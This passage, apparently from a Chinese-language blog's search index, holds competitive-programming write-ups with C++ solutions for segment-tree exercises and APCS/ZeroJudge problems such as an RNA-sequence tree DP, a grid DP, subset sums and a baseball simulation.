int cmd, a, b;        cin &gt;&gt; cmd &gt;&gt; a;        if(cmd == 1){            no_pt[a] = 1;            for(int i : G[a])                if(no_pt[i]==1) op.eb(a+N, i+N);// cout &lt;&lt; \"bye \" &lt;&lt; a &lt;&lt; ' ' &lt;&lt; i &lt;&lt; '\\n';        }        else cin &gt;&gt; b, op.eb(a, b);    }    for(int i = 0; i&lt;m; i++){        if(no_pt[e[i].x]==1 &amp;&amp; no_pt[e[i].y]==1) continue;        // cout &lt;&lt; e[i].x &lt;&lt; \" connect \" &lt;&lt;e[i].y&lt;&lt;'\\n';        bose[find_bose(e[i].x)] = find_bose(e[i].y);    }    while(!op.empty()){        pii cur = op.back(); op.popb();        if(cur.x &lt; N) ans.eb(find_bose(cur.x)==find_bose(cur.y));        else bose[find_bose(cur.x-N)] = find_bose(cur.y-N);    }while(!ans.empty()){        bool a = ans.back(); ans.popb();        cout &lt;&lt; (a ? \"YES\\n\" : \"NO\\n\");    }    return 0;}\n2022\n師大附中暑期資訊培訓模擬競賽 I PB \n2022\n師大附中暑期資訊培訓模擬競賽 II PC \n2020 花中一模 PE\n\n","categories":["演算法","圖論"],"tags":["演算法","圖論"]},{"title":"線段樹練習","url":"/segment_tree/","content":"前言 \n線段樹們。\n\n區間詢問單點修改 \nneoj80 RMQ 問題\n#include &lt;bits/stdc++.h&gt;using namespace std;const int N = 1E6 + 6;int arr[N], seg[N*4];void build(int l, int r, int idx){    if(r==l+1){         seg[idx] = arr[l];        return;    }    int mid = (l+r)/2;    build(l, mid, idx*2+1), build(mid, r, idx*2+2);    seg[idx] = min(seg[idx*2+1], seg[idx*2+2]);}int query(int l, int r, int ql, int qr, int idx){    if(ql==l &amp;&amp; qr==r) return seg[idx];    int mid = (l+r)/2;    if(ql&gt;=mid) return query(mid, r, ql, qr, idx*2+2);    if(qr&lt;=mid) return query(l, mid, ql, qr, idx*2+1);    return min(query(l,mid, ql, mid, idx*2+1), query(mid,r, mid, qr, idx*2+2));}void modify(int l, int r, int chg_place, int chg_data, int idx){    if(r==l+1 &amp;&amp; l==chg_place) {         seg[idx]=chg_data;        return;    }    int mid = (l+r)/2;    if(chg_place&gt;=mid) modify(mid, r, chg_place, chg_data, idx*2+2);    else modify(l, mid, chg_place, chg_data, idx*2+1);    seg[idx] = min(seg[idx*2+1], seg[idx*2+2]);}signed main(){    // ios::sync_with_stdio(0);    // cin.tie(0), cout.tie(0);    int n, t;    cin &gt;&gt;t&gt;&gt;n;    for(int i =0; i&lt; n; i++) cin &gt;&gt; arr[i];    build(0,n,0);    while(t--){        int cmd, x, y;        cin &gt;&gt; cmd &gt;&gt; x &gt;&gt;y;        if(cmd == 1) cout &lt;&lt; query(0, n, x, y+1,0) &lt;&lt; '\\n';        if(cmd == 2) modify(0, n, x, y,0);    }    return 0;}\n區間修改區間詢問 - lazy tag \nneoj257\n#include &lt;bits/stdc++.h&gt;using namespace std;const int N = 2000006;struct node{    int turn, reset, data1, data2, data3;}seg[N*4];void build(int l, int r, int idx){    seg[idx] = {0,0,1,0,0};    if(l==r-1) return;    int mid = (l+r)/2;    build(l, mid, idx*2+1), build(mid, r, idx*2+2);    seg[idx].data1 = seg[idx*2+1].data1 + seg[idx*2+2].data1;    //cout &lt;&lt; l &lt;&lt; ' ' &lt;&lt;r &lt;&lt; ' ' &lt;&lt; seg[idx].data1 &lt;&lt; '\\n';}void push(int l, int r, int idx){    //cout &lt;&lt; seg[idx].reset &lt;&lt; ' ' &lt;&lt; seg[idx].turn &lt;&lt; ' ' ;    if(seg[idx].reset){        seg[idx].data1 += seg[idx].data2 + seg[idx].data3;        seg[idx].data2 = 0; seg[idx].data3 = 0;        seg[idx].reset=0;        if(r&gt;l+1) seg[idx*2+1].reset=1, seg[idx*2+1].turn=0;        if(r&gt;l+1) seg[idx*2+2].reset=1, seg[idx*2+2].turn=0;    }    if(seg[idx].turn){ //bj        seg[idx].turn %= 3;        if(r&gt;l+1) seg[idx*2+1].turn+=seg[idx].turn;        if(r&gt;l+1) seg[idx*2+2].turn+=seg[idx].turn;        while(seg[idx].turn-- &gt; 0) swap(seg[idx].data1, seg[idx].data2), swap(seg[idx].data1, seg[idx].data3);        seg[idx].turn = 0;    } //cout &lt;&lt; l &lt;&lt; ' ' &lt;&lt;r &lt;&lt; ' ' &lt;&lt;seg[idx].data1 &lt;&lt; ' ' &lt;&lt; seg[idx].data2 &lt;&lt;' ' &lt;&lt;seg[idx].data3 &lt;&lt;'\\n';}int count(int l, int r, int ql, int qr, int idx){    push(l,r,idx);    if(l==ql &amp;&amp; r==qr) return seg[idx].data1;    int mid = (l+r)/2;    if(ql&gt;=mid) return count(mid, r, ql, qr, idx*2+2);    if(qr&lt;=mid) return count(l, mid, ql, qr, idx*2+1);    return count(l, mid, ql, mid, idx*2+1) + count(mid, r, mid, qr,idx*2+2);}void turn(int l, int r, int ml, int mr, int idx){    push(l,r,idx);    int mid = (l+r)/2;    if(l==ml &amp;&amp; r==mr){        seg[idx].turn++;        return;    }else if(ml&gt;=mid)    turn(mid, r, ml, mr, idx*2+2);    else if(mr&lt;=mid)    turn(l, mid, ml, mr, idx*2+1);    else turn(l, mid, ml, mid, idx*2+1), turn(mid, r, mid, mr,idx*2+2);    push(l,mid,idx*2+1); push(mid,r,idx*2+2);    seg[idx].data1=seg[idx*2+1].data1+seg[idx*2+2].data1;    seg[idx].data2=seg[idx*2+1].data2+seg[idx*2+2].data2;    seg[idx].data3=seg[idx*2+1].data3+seg[idx*2+2].data3;}void reset(int l, int r, int ml, int mr, int idx){    push(l,r,idx);    int mid = (l+r)/2;    if(l==ml &amp;&amp; r==mr){        seg[idx].reset = 1;        return;    }else if(ml&gt;=mid)    reset(mid, r, ml, mr, idx*2+2);    else if(mr&lt;=mid)    reset(l, mid, ml, mr, idx*2+1);    else reset(l, mid, ml, mid, idx*2+1), reset(mid, r, mid, mr,idx*2+2);    push(l,mid,idx*2+1); push(mid,r,idx*2+2);    seg[idx].data1=seg[idx*2+1].data1+seg[idx*2+2].data1;    seg[idx].data2=seg[idx*2+1].data2+seg[idx*2+2].data2;    seg[idx].data3=seg[idx*2+1].data3+seg[idx*2+2].data3;}signed main(){    // ios::sync_with_stdio(0);    // cin.tie(0); cout.tie(0);    int n, m;    cin &gt;&gt; n &gt;&gt;m;    build(0, n, 0);    while(m--){        string cmd;        int a, b;        cin &gt;&gt; cmd &gt;&gt; a &gt;&gt; b;        if(cmd == \"TURN\") turn(0, n, --a, b, 0);        if(cmd == \"RESET\") reset(0, n, --a, b, 0);        if(cmd == \"COUNT\") cout &lt;&lt; count(0, n, --a, b, 0) &lt;&lt; '\\n';    }    return 0;}\n寫點題目 \nneoj249\n#include &lt;bits/stdc++.h&gt;#define int long long#define piii pair&lt;int ,pair&lt;int, int&gt;&gt;#define ans first#define pre second.first#define suf second.secondusing namespace std;const int N = 1E5 + 5;int arr[N], arr_pre[N], seg[N*4], seg_pre[N*4], seg_suf[N*4];int n, q;int sum(int a, int b){    if(a&gt;0) return arr_pre[b-1]-arr_pre[a-1];    return  arr_pre[b-1];   }; //[a,b)void build(int l, int r, int idx){    if(r-l == 1){        seg[idx] = seg_pre[idx] = seg_suf[idx]= arr[l];                return;    }int mid = (l+r)/2;    build(l, mid, idx*2+1), build(mid, r, idx*2+2);    seg_pre[idx] = max(seg_pre[idx*2+1], sum(l, mid)+seg_pre[idx*2+2]);    seg_suf[idx] = max(seg_suf[idx*2+2], sum(mid, r)+seg_suf[idx*2+1]);    seg[idx] = max(seg_suf[idx*2+1]+seg_pre[idx*2+2], max(seg[idx*2+1], seg[idx*2+2]));    }piii query(int l , int r, int ql, int qr, int idx){    if(l==ql &amp;&amp; r==qr) return {seg[idx], {seg_pre[idx], seg_suf[idx]}};    int mid = (l+r)/2;    if(ql&gt;=mid) return query(mid, r, ql, qr, idx*2+2);    if(qr&lt;=mid) return query(l, mid, ql, qr, idx*2+1);    piii lres = query(l, mid, ql, mid, idx*2+1);    piii rres = query(mid, r, mid, qr, idx*2+2);    return {max(lres.suf+rres.pre, max(rres.ans, lres.ans)),         {max(lres.pre, sum(l, mid)+rres.pre), max(rres.suf, sum(mid, r)+lres.suf)}};}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    cin &gt;&gt; n &gt;&gt; q;    memset(arr, 0 , sizeof(arr));    memset(arr_pre, 0 , sizeof(arr_pre));    memset(seg, 0 , sizeof(seg));    memset(seg_pre, 0 , sizeof(seg_pre));    memset(seg_suf, 0 , sizeof(seg_suf));    for(int i = 0; i&lt; n; i++) cin &gt;&gt;arr[i], arr_pre[i] = arr[i] + arr_pre[(i-1)*(i&gt;0)];    build(0, n, 0);    while(q--){        int x, y;        cin &gt;&gt; x &gt;&gt; y;        cout &lt;&lt; max(query(0, n, --x, y, 0).ans, 0ll) &lt;&lt; '\\n';    }    return 0;}\nneoj259\nneoj367\nneoj368\n2022 附中校內賽 PE\n2022\n師大附中暑期資訊培訓模擬競賽 I PE\n","categories":["演算法","線段樹"],"tags":["演算法","線段樹"]},{"title":"APCS 病毒演化 (zerojudge f582)","url":"/zerojudge_f582/","content":"題目網址\n科學家發現了 \\(n\\) 種病毒，編號分別是 \\(1\\) 到 \\(n\\)，已知每一種病毒可以用一個 RNA 序列來表達，RNA 序列是一個長度為 \\(m\\) 的字串，其中包含 A、U、C、G、@等字元，其中 @\n為科學家沒觀察清楚的位置，可能為 A、U、C、G 其中任何一種。\n科學家也研究出了這些病毒的演化關係，除了一個最原始的病毒以外，每一種病毒都是從另一個病毒演化而來的，這些病毒會構成一個樹狀結構的病毒族譜 (如圖)。\n\n兩個 RNA\n序列的的距離定義為它們的漢明距離，也就是相異的位數個數。更具體的說，對於兩個長度都是\n\\(m\\) 的 RNA 序列 \\(a, b\\)，它們的漢明距離就是有幾個位置 \\(i\\) 滿足 \\(a_i\\neq b_i\\) 。\n你想知道目前的病毒族譜的每一個 RNA 序列中的 @ 字元的填入 A、U、C、G\n中的其中一個字元後，每一個病毒與它演化來源的病毒的距離總合最小值是多少?\n（後面就簡稱最小演化距離）\n\n\n解題思路：\n這題我是用 DP 寫，並使用 DFS 從根遍歷整棵樹，在過程完成狀態轉移。\n在寫這題的時候，最困難的應該就是要想怎麼定義狀態還有狀態轉移如何在 \\(O(1)\\) 內做出來。\n把這題看作是求 \\(m\\) 次 RNA 長度為\n\\(1\\) 時的最小演化距離（把一串 RNA 拆成\n\\(m\\) 個字元分開處理) ，最後再把這\n\\(m\\) 個最小演化距離相加即可。\n不妨定義 \\(dp[i][j][k]\\)\n代表目前單獨處理第 \\(j\\) 個字元，點\n\\(i\\) 病毒 RNA 序列的第 \\(j\\) 個字元為 \\(k\\) 時，求該點為根節點時的最小演化距離 (A,\nU, C, G 分別對應到 \\(k = 1, 2, 3, 4\\) )\n，而當點 \\(i\\) 病毒序列中的第 \\(j\\) 個字元已經被定義時 (也就是不為 @ 時)\n，就將 \\(k\\)\n為其餘狀態的最小演化距離設為極大值。\n在狀態轉移時，就會是所有子樹的子節點在四種狀態的最小演化距離，加上與當前結點的距離\n(就是看子節點當前狀態是否跟父節點一樣，一樣距離就是 0 不一樣就是 1)\n的最小值，以數學式表達如下 (其中 \\(child\\) 代表第 \\(i\\) 個陣列的子節點個數， \\(child_p\\) 代表點 \\(i\\) 第 \\(p\\) 個子節點) ：\n\\[dp[i][j][k] = \\sum_{p=1}^{child}\nmin(dp[child_p][j][1] + (k != 1), dp[child_p][j][2] + (k != 2),\ndp[child_p][j][3] + (k != 3), dp[child_p][j][4] + (k !=\n4))\\]\n而最後答案就是：\n\\[\\sum_{j=0}^{m-1} min(dp[root][j][1],\ndp[root][j][2], dp[root][j][3], dp[root][j][4])\\]\n總複雜度為 \\(O(nm)\\)\n🌟 在當沒有小孩時 (葉節點) ，以其做為根的最小演化距離 (dp 值)\n除了被設為極大值的狀態外，均為 0。\n\n病毒演化#include &lt;bits/stdc++.h&gt;#define Max 1000000using namespace std;int n, m;int dp[1003][81][6];// dp[i][j][k] 代表第i個陣列的第j個字元為k時的單點至葉子最小距離// k=1,2,3,4代表A,U,C,G// 當該點已經被是確認的點時（不為@）設其dp值為 Max// dp[i][j][k] = Σmin(dp[i_child][j][1~4]+k!=1~4)// if i no child: dp[i][j][k] = 0map&lt;char, int&gt; get_index = {{'A',1},{'U',2},{'C',3},{'G',4}};vector&lt;int&gt; child[1003];int calculate(int idx, int num, int ch){    if(dp[idx][num][ch] != -1) return dp[idx][num][ch];    if(child[idx].empty()) return dp[idx][num][ch] = 0;    dp[idx][num][ch] = 0;    for(int i: child[idx]){        int add = Max;        for(int k = 1; k&lt;=4; k++)            add = min(add, (calculate(i, num, k) + (k!=ch)));        dp[idx][num][ch] += add;    }    //cout &lt;&lt; idx &lt;&lt; ' ' &lt;&lt; num &lt;&lt; ' ' &lt;&lt; ch &lt;&lt; \": \" &lt;&lt; dp[idx][num][ch] &lt;&lt; '\\n';    return dp[idx][num][ch];}int main() {    ios::sync_with_stdio(0);    cin.tie(0);     cin &gt;&gt; n &gt;&gt; m;    int root_idx;    string tmp;    for(int i = 0, tmpI, tmpJ; i &lt; n; i++){        cin &gt;&gt; tmpI &gt;&gt; tmpJ;        if(tmpI == tmpJ) root_idx = tmpI;        else child[tmpJ].push_back(tmpI);        cin &gt;&gt; tmp;        for(int j = 0; j &lt; m; j++){            for(int k = 1; k &lt;= 4; k++){                dp[tmpI][j][k] = -1;                if(tmp[j] != '@' &amp;&amp; k != get_index[tmp[j]])                     dp[tmpI][j][k] = Max;            }        }    }    int ans = 0;    for(int j = 0; j&lt; m; j++){        int little_ans = Max;        for(int k = 1; k &lt;= 4; k++)            little_ans=min(little_ans, calculate(root_idx, j, k));        ans+=little_ans;    }    cout&lt;&lt;ans&lt;&lt;'\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 勇者修練 (zerojudge f314)","url":"/zerojudge_f314/","content":"題目網址\n輸入為 \\(m \\times\nn\\) 大小的的陣列，每一格是一個介於 -100 與 100\n之間的整數，表示經過這格可以累積的經驗值。\n你可以從最上面一排任何一個位置開始，在最下面一排任何一個位置結束。\n過程中每一步可以選擇往左、往右或往下走，但不能走回已經經過的位置。\n請你算出最多可以獲得的經驗值總和 (可能是負數)。\n\n\n解題思路：\n這題比較困難的地方是每一步是可以往左也可以往右的，我的解決方法是一樣使用 DP，每層計算時先從左邊往右跑一次，再從右邊往左跑一次，最後取兩個方向中比較大的當作那個點的值，可以這樣做是因為在每一層中到達一個點一定是在該層移動時，方向必定不變 (也就是說左邊來的就會是一路向左，從右邊來的就會是一路向右)，因此只要個別比較這兩種狀況就能解決了。\n詳細的狀態轉移式可以見程式碼中的註解。\n🌟\n因為每次在比較兩個方向時都是在比較同一層的，所以可以就單純開一個一為陣列紀錄，但兩個方向的值一定要在最後都跑完之後再比較，假設事先計算由左往右再計算由右往左，如果在右往左時每算完一個數就比跟左往右的比較一次，那當計算新的點時其右邊的最大經驗就可能會是從左邊加過去的，那目前這格的數字就會被重複計算。\n\n勇者修練#include &lt;bits/stdc++.h&gt;using namespace std;int n, m, arr[51][10004], dp[51][10004];// dp[i][j] 表示第i層的第j個到第0層的最大經驗// 左至右// dp[0][0]=arr[0][0]// dp[0][j]=max(dp[0][j-1], 0)+arr[0][j], j&gt;0// dp[i][0]=dp[i-1][0]+arr[i][0], i&gt;0// dp[i][j]=max(dp[i-1][j], dp[i][j-1])+arr[i][j], j&gt;0, i&gt;0// 右至左// _dp[0][n-1]=arr[0][n-1]// _dp[0][j]=max(_dp[0][j+1], 0)+arr[0][j], j&lt;n-1// _dp[i][n-1]=_dp[i-1][n-1]+arr[i][n-1], i&gt;0// _dp[i][j]=max(_dp[i-1][j], _dp[i][j+1])+arr[i][j], j&lt;n-1, i&gt;0// 每層先取完左至右跟右至左後，去較大者為dp[i][j]// ans=max(dp[m-1][j]), 0&lt;=j&lt;=n-1signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    memset(dp, 0, sizeof(dp));    cin &gt;&gt; m &gt;&gt; n;    for (int i = 0; i &lt; m; i++)        for (int j = 0; j &lt; n; j++)             cin &gt;&gt; arr[i][j];        for (int i = 0; i &lt; m; i++){        for(int j = 0; j &lt; n; j++){            if (i == 0 &amp;&amp; j==0)                dp[0][0] = arr[0][0];            else if (i==0)                dp[0][j] = max(dp[0][j-1], 0)+arr[0][j];            else if (j == 0)                dp[i][0] = dp[i-1][0] + arr[i][0];            else                dp[i][j] = max(dp[i-1][j], dp[i][j-1]) + arr[i][j];        }        int tmp_r_dir[10004];        for(int j = n-1; j &gt;= 0; j--){            if (i == 0 &amp;&amp; j==n-1)                tmp_r_dir[j] = arr[0][n-1];            else if (i==0)                tmp_r_dir[j] = max(tmp_r_dir[j+1], 0)+arr[0][j];            else if (j == n-1)                tmp_r_dir[n-1] = dp[i-1][n-1]+arr[i][n-1];            else                tmp_r_dir[j] = max(dp[i-1][j], tmp_r_dir[j+1])+arr[i][j];        }for(int j = 0; j &lt; n; j++) dp[i][j] = max(dp[i][j], tmp_r_dir[j]);    }        int ans = -5000006;    for(int j = 0; j &lt; n; j++)        ans = max(ans, dp[m - 1][j]);    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\n\n\n AC 的 Submission～!\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 置物櫃分配 (zerojudge e465)","url":"/zerojudge_e465/","content":"題目網址\n你是個櫃子租借商，總共擁有 M 個櫃子。\n現在這 M 個櫃子分別被 N 個人借用，借用量分別為 (x0, x1, x2, …xN-1)\n個櫃子，\n其中 x0 + x1 + x2 + … + xN-1 ≤ M\n現在你想要使用 S 個空櫃子，\n在被借用的櫃子只能夠 全退 或 全不退之下，最少需要請這 N\n個人退還多少櫃子？\n也就是當有一個人借用 10 個櫃子時，不能夠只請他退還 5 個櫃子。\n\n\n解題思路：\n這題我的做法是先整理出哪些櫃子數量可以由數個 x 相加而成，然後再找大於等於需要櫃子量的最小值，不過這樣依照題目給定的 N、M 範圍應該是過不了的，在最糟狀況下會是 \\(O(N^2+M)\\)，只是試了之後是可以 AC 的，後來看別人的解法是用 01 背包問題解，但也會到 \\(O(MN)\\)，如果是這樣的範圍應該要比較像中一中 judge 上的這題，不過輸入順序不同，需要稍微修改。\n🌟題目給的 S 是需要的空櫃子，但事實上那些人要給你的數量只有 S-(M-total_x)，total_x 表示所有 x 的和，也就是說，如果 S-(M-total_x) 是負的，那就代表你不需要請人退櫃子，因為你已經有足夠的空櫃子了，而當正的時候，就是你需要請人退櫃子的數量。\n\nAPCS 置物櫃分配#include &lt;bits/stdc++.h&gt;using namespace std;int n, m, s, total_x=0, x[100005];bool add[100005];vector&lt;int&gt; add_history;//add[i] 表示x陣列是否能任意選取使得加總為i//將題目轉換判斷x陣列是否能任意選取使得加總為k，再遍歷整個陣列找大於等於需要量的最小值signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    memset(add,0,sizeof(add));    cin&gt;&gt; m&gt;&gt; s &gt;&gt; n;    for(int i = 0; i&lt;n; i++) cin &gt;&gt; x[i], total_x+=x[i];    add_history.push_back(0), add[0]=1;    for(int i = n-1;i&gt;=0;i--){        vector&lt;int&gt; new_history;        for(int num : add_history){            int cur = num+x[i];            if(!add[cur]) add[cur]=1, new_history.push_back(cur);        }for(int num : new_history) add_history.push_back(num),add[num]=1;    }    s -= (m-total_x); //s表示還需要的櫃子數量    if(s&lt;=0){        cout &lt;&lt; 0 &lt;&lt; '\\n';    }else{        for(int i = s;i&lt;=total_x; i++)            if(add[i]){                cout &lt;&lt; i &lt;&lt; '\\n'; break;            }    }    return 0;}\n\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 內積 (zerojudge i402)","url":"/zerojudge_i402/","content":"題目網址\n你有兩個數組分別為 \\(n\\) 和 \\(m\\) 的長度：\n\\(A_1, A_2, \\dots, A_n\\) 和 \\(B_1, B_2, \\dots, B_m\\)\n你可以自由決定是否要鏡射 \\(A, B\\)\n陣列 (reverse)，也可以自由決定一個正整數 \\(r\\)。\n且當選擇 \\(A, B\\) 分別交換一個長度為\n\\(r\\)\n的子陣列 (subarray)，並讓該兩個子陣列的內積最大化。\n內積的定義如下：\n假設從 \\(A\\) 陣列選擇了一段長度為 \\(r\\) 的子陣列 \\(A_{i}, A_{i+1}, A_{i+2}, \\dots,\nA_{i+r-1}\\)，\n並在 \\(B\\) 陣列選擇了一段長度為 \\(r\\) 的子陣列 \\(B_{j}, B_{j+1}, B_{j+2}, \\dots,\nB_{j+r-1}\\)，\n這兩個子陣列的內積就是\n\\[A_i \\times B_j + A_{i+1} \\times B_{j+1} +\nA_{i+2} \\times B_{j+2} + \\dots + A_{i+r-1} \\times\nB_{j+r-1}\\]\n或可以簡單寫成 \\(\\sum_{k=0}^{r-1} A_{i+k}\n\\times B_{j+k}\\)\n\n\n解題思路：\n這題我的做法是使用 DP，給定 \\(dp[i][j]\\) 為 \\(a[i]\\) 與 \\(b[j]\\) 往後直到其中一個底端的區間內任意 \\(r\\) 值最大內積，可以知道當 \\(r=1\\) 時，\\(dp[i][j] = a[i]*b[j]\\)，而對於 \\(n-i&gt;1\\) 且 \\(m-j&gt;1\\) 的狀態轉移就會是：\n\\[dp[i][j]=max(a[i]*b[j], dp[i+1][j+1],\npre[i+1][j+1]+a[i]*b[j])\\]\n其中 \\(pre[i][j]\\) 代表以 \\(a[i]\\) 與 \\(b[j]\\) 為開頭的最大內積前綴和，由此應該就能很清楚的理解轉移式的意義，\\(a[i]\\) 與 \\(b[j]\\) 後的最大內積，只有可能是 \\(a[i+1]\\) 跟 \\(b[i+1]\\) 為開頭的最大內積、\\(a[i]\\) 跟 \\(b[j]\\) 為開頭的最大內積前綴和加上 \\(a[i]*b[j]\\) 的內積或是自己本身 \\(a[i]*b[j]\\)。\n🌟\n在翻轉的部分只要將其中一個陣列翻轉過來即可，因為不論是正向還是反向，兩個陣列的內積都是一樣的，因此只要將其中一個陣列翻轉過來，再做一次正向的內積即可。\n❗️ \\(dp[0][0]\\) 不一定會是整個陣列的最大值，因為 \\(n、m\\) 可能不一樣大，\\(dp[i][j]\\) 的定義是 \\(a[i]\\) 與 \\(b[j]\\)，往後直到其中一個底端的區間內任意 \\(r\\) 值最大內積，因此若其中一個先碰到了底端，但事實上另一個陣列跟其他段內積會更大的話，就會使得 \\(dp[0][0]\\) 不是最大值，因此較簡單的方法是在做狀態轉移時，將用一個變數紀錄 \\(dp[i][j]\\) 的最大值。\n\nAPCS 內積#include &lt;bits/stdc++.h&gt;#define Max(a,b,c) max(a,max(b,c))using namespace std;int a[1005], b[1005], n, m, dp[1005][1005], pre[1005][1005], ans=-100000008;//dp[i][j]表示a[i]與b[j]之後的最大內積//pre[i][j]表示包含a[i]與b[j]最大前綴合//init: dp[i][j]=a[i]*b[j]//dp[i][j]=max(a[i]*b[j], dp[i+1][j+1], pre[i+1][j+1]+a[i]*b[j]) | n-i&gt;1 &amp;&amp; m-j&gt;1//pre[i][j]=max(a[i]*b[j], pre[i+1][j+1]+a[i]*b[j])void calculate(){    memset(dp, 0, sizeof(dp));    memset(pre, 0, sizeof(pre));    for(int i = n-1;i&gt;=0;i--){        for(int j = m-1;j&gt;=0;j--){            dp[i][j]=a[i]*b[j];            if(n-i&gt;1 &amp;&amp; m-j&gt;1)                dp[i][j] = Max(a[i]*b[j], dp[i+1][j+1], pre[i+1][j+1]+a[i]*b[j]);            pre[i][j]=max(a[i]*b[j], pre[i+1][j+1]+a[i]*b[j]); //pre[i][j]超過範圍的地方會是0            ans=max(ans, dp[i][j]);        }    }}int main(){    ios::sync_with_stdio(0);    cin.tie(0);    cin&gt;&gt;n&gt;&gt;m;    for(int i = 0; i&lt;n;i++) cin&gt;&gt; a[i];    for(int i = 0; i&lt;m;i++) cin &gt;&gt; b[i];    calculate();    for(int i = 0; i&lt; n/2; i++) swap(a[i],a[n-i-1]);    calculate();    cout&lt;&lt;ans&lt;&lt;'\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 開啟寶盒 (zerojudge k734)","url":"/zerojudge_k734/","content":"題目網址\n已知有 \\(n\\) 個寶盒編號 \\(0\\) 到 \\(n-1\\) 以及 \\(m\\) 種鑰匙編號 \\(0\\) 到 \\(m-1\\)。一開始你有 \\(t\\) 種鑰匙分別為 \\(x_1,..., x_t\\)\n每一個寶盒要打開都需要同時擁有 \\(k\\) 種鑰匙，第 \\(i\\) 個寶盒分別需要 \\(r_{i1},r_{i2}, ... ,\nr_{ik}\\) 種類的鑰匙。每個寶盒打開後都會得到 \\(k\\) 種鑰匙，第個寶盒打開後分別會得到 \\(s_{i1},s_{i2}, ... ,\ns_{ik}\\) 種類的鑰匙，當拿到新的鑰匙之後可以繼續開啟新的寶盒。保證寶盒內的鑰匙不會重複，並且每種鑰匙可以開啟的寶盒數量不超過 \\(60\\)。\n請輸出最多可以開啟多少個寶盒。\n\n\n解題思路：\n我在這題使用了三個陣列分別代表以下意義：\n\n每個寶盒目前還需要幾個鑰匙才可以打開，初始化每個設為 \\(k\\)\n\n紀錄鑰匙可以打開哪些寶箱\n\n紀錄寶箱打開後可以得到哪些鑰匙\n\n之後再將目前已有的鑰匙拿去開寶箱，因為有鑰匙對應寶箱的陣列，因此就把對應到的寶箱需開啟鑰匙數 - 1，若發現歸零就把他的鑰匙釋放出來繼續開新的寶箱，直到不能開為止。\n🌟第 2、3 兩個陣列可以使用 vector 會在實作上比較方便，另外在開寶箱的過程可以使用遞迴的方式撰寫會比較簡單\n\nAPCS 開啟寶盒#include &lt;bits/stdc++.h&gt;using namespace std;vector&lt;int&gt; keys[100005]; //鑰匙索引可被開啟的vector&lt;int&gt; keys_get[100005]; //開啟後得到的int need_many_keys[100005], n ,m ,k;void add_key(int num){    while(!keys[num].empty()){        int cur = keys[num].back(); keys[num].pop_back();        need_many_keys[cur]--;        if(!need_many_keys[cur])            for(int i : keys_get[cur])                add_key(i);    }}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;    for(int i=0;i&lt;n;i++) need_many_keys[i]=k;    int ans = 0, now_key[100005], t;    cin&gt;&gt;t;    for(int i=0;i&lt;t;i++) cin &gt;&gt; now_key[i];    for(int i = 0; i&lt; n;i++)        for(int j = 0,tmp;j&lt;k;j++)            cin&gt;&gt;tmp, keys[tmp].push_back(i);    for(int i = 0; i&lt; n;i++)        for(int j = 0,tmp;j&lt;k;j++)            cin&gt;&gt;tmp, keys_get[i].push_back(tmp);    for(int i =0; i&lt;t; i++) add_key(now_key[i]);        for(int i = 0; i&lt;n;i++) ans += (need_many_keys[i]&lt;=0);    cout&lt;&lt;ans&lt;&lt;'\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS-2016-1029-4 棒球遊戲 (zerojudge c297)","url":"/zerojudge_c297/","content":"題目網址\n謙謙最近迷上棒球，他想自己寫一個簡化的遊戲計分程式。這會讀入隊中每位球員的打擊結果，然後計算出球隊得分。\n這是個簡化版的模擬，假設擊球員打擊結果只有以下情況：\n(1) 安打：以 1B,2B,3B 和 HR\n分別代表一壘打、二壘打、三壘打和全（四）壘打。\n(2) 出局：以 FO,GO 和 SO 表示。\n請寫出具備這樣功能的程式，計算球隊總得分。\n\n\n解題思路：\n這題應該算是基礎的資料結構，可以想一下球員的跑壘方式，先上壘的會先出來，那麼就可以使用 queue 實作，每個一個安打 pop 幾次，如果 pop 到的地方是有人的話就把分數加一。\n🌟可以把題目指令轉換成數字，在實作上會比較方便，轉成數字的方法可以用 map 完成，整體程式就會更簡單。\n\nAPCS-2016-1029-4 棒球遊戲#include &lt;bits/stdc++.h&gt;using namespace std;//以1B,2B,3B和HR 分別代表一壘打、二壘打、三壘打和全（四）壘打//以 FO,GO和 SO表示 出局map&lt;string,int&gt; action = {{\"1B\",1},{\"2B\",2},{\"3B\",3},{\"HR\",4},{\"FO\",5},{\"GO\",5},{\"SO\",5}};signed main(){    queue&lt;string&gt; player[11];    queue&lt;bool&gt; base;    base.push(0),base.push(0),base.push(0);    int out, cur_out = 0, score=0;    for(int i = 0,n; i&lt;9; i++){        cin &gt;&gt; n;        string tmp;        for(int j=0; j &lt; n; j++) cin&gt;&gt;tmp, player[i].push(tmp);    }    cin &gt;&gt; out;    bool clear=0;    for(int cur_pl = 0; out!=cur_out; cur_pl=(cur_pl+1)%9){        if(clear){            for(int i = 0; i&lt;3; i++) base.pop(),base.push(0);            clear=0;        }        int cmd = action[player[cur_pl].front()];        player[cur_pl].pop();        if(cmd==5) cur_out++, clear=!(cur_out%3);        else{             base.push(1),score+=base.front(),base.pop();            for(int i = 0; i&lt;cmd-1; i++)                score+=base.front(),base.pop(),base.push(0);        }    }    cout &lt;&lt; score &lt;&lt; '\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 磁軌移動序列 (zerojudge k733)","url":"/zerojudge_k733/","content":"題目網址\n你拿到一個磁帶和一串指令。磁帶上的指針初始位置為 10，我們將其表示為\nT10。指令是一個由多個 T 和 loop\n指令組成的字串，每個指令都會影響指針的移動。\nT 指令的格式為 Txx，其中 xx\n是兩位數的整數（10~99），代表指針從當前位置移動到 xx 所指示的位置。\n除了 T 指令外，還有一個 loop 指令結構，其格式為 Lx…E，其中 x\n是一位數的整數（1~9）。loop 指令允許重複執行一系列指令。loop\n指令的開始標記為 Lx，結束標記為 E，指令序列位於這兩個標記之間。loop\n指令可以嵌套，也就是說，一個 loop 指令的內部可以包含其他的 